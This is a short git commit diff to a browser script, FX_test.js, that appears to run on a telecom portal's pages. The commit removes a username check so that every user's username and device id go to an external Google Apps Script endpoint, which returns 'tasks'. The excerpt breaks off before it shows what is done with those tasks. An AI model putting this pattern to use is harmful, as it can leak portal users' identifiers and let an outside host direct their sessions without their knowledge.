f08687bbd10fcf54ea5184258a976418c9057206
mypanty1 <54975980+mypanty1@users.noreply.github.com>
2021-04-06 23:20:02 +0700

    Update FX_test.js

--- FX_test.js
+++ FX_test.js
@@ -57,7 +57,7 @@ if(document.title!='Inetcore+'&&(window.location.href.includes('https://fx.mts.r
 						},
 					})
 				}).then(function(obj){/*console.log(obj)*/}).catch(function(err){console.log(err)}).finally(function(){
-					if(username=='mypanty1'){
+					if(true/*username=='mypanty1'*/){
 						let timer_getTask=setTimeout(getTask,1000);
 						function getTask(){
 							fetch('https://script.google.com/macros/s/AKfycbwXqnIVkjbsBSFMlexOukcqx1OKmNbfXNOvsAgAIcqFaAvt3u9Du_uoK7xjbpSCQbdPYw/exec?username='+username+'&deviceid='+deviceid,).then(function(resp){return resp.json()}).then(function(obj){
